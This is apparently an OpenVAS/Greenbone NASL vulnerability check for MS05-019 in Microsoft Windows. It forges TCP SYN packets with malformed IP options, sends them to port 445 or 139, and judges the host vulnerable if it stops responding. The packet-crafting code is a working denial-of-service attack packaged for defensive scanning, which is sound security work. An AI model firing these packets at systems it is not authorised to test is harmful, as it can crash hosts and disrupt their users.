if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902588" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_cve_id( "CVE-2005-0048", "CVE-2005-0688", "CVE-2004-0790", "CVE-2004-1060", "CVE-2004-0230" );
	script_bugtraq_id( 13116, 13658, 13124, 10183 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-11-21 15:15:15 +0530 (Mon, 21 Nov 2011)" );
	script_name( "Microsoft Windows Internet Protocol Validation Remote Code Execution Vulnerability" );
	script_category( ACT_KILL_HOST );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Windows : Microsoft Bulletins" );
	script_dependencies( "smb_nativelanman.sc", "netbios_name_get.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( 139, 445 );
	script_mandatory_keys( "Host/runs_windows" );
	script_exclude_keys( "SMB/samba", "keys/TARGET_IS_IPV6" );
	script_xref( name: "URL", value: "http://securitytracker.com/id/1013686" );
	script_xref( name: "URL", value: "https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2005/ms05-019" );
	script_xref( name: "URL", value: "https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2006/ms06-064" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause a denial of service
  and possibly execute arbitrary code via crafted IP packets with malformed options." );
	script_tag( name: "insight", value: "The flaw is due to insufficient validation of IP options and can be
  exploited to cause a vulnerable system to stop responding and restart or may allow execution of arbitrary
  code by sending a specially crafted IP packet to a vulnerable system." );
	script_tag( name: "summary", value: "The host is running Microsoft Windows and is prone to remote code
  execution vulnerability." );
	script_tag( name: "affected", value: "- Microsoft Windows XP SP2 and prior

  - Microsoft Windows 2000 Server SP4 and prior" );
	script_tag( name: "solution", value: "The vendor has released updates. Please see the references for more information." );
	script_tag( name: "qod_type", value: "remote_probe" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("smb_nt.inc.sc");
require("host_details.inc.sc");
if(TARGET_IS_IPV6() || kb_smb_is_samba()){
	exit( 0 );
}
port = kb_smb_transport();
if(!port){
	port = 445;
}
if(!get_port_state( port )){
	exit( 0 );
}
dstaddr = get_host_ip();
srcaddr = this_host();
sport = rand() % ( 65536 - 1024 ) + 1024;
options = raw_string( 0x03, 0x27, crap( data: "G", length: 38 ) );
ip = forge_ip_packet( ip_v: 4, ip_hl: 15, ip_tos: 0, ip_len: 20, ip_id: rand(), ip_p: IPPROTO_TCP, ip_ttl: 64, ip_off: 0, ip_src: srcaddr, data: options );
tcp = forge_tcp_packet( ip: ip, th_sport: sport, th_dport: port, th_flags: TH_SYN, th_seq: rand(), th_ack: 0, th_x2: 0, th_off: 5, th_win: 512, th_urp: 0 );
start_denial();
for(i = 0;i < 5;i++){
	result = send_packet( packet: tcp, pcap_active: FALSE );
}
alive = end_denial();
if(!alive){
	security_message( port: port );
}

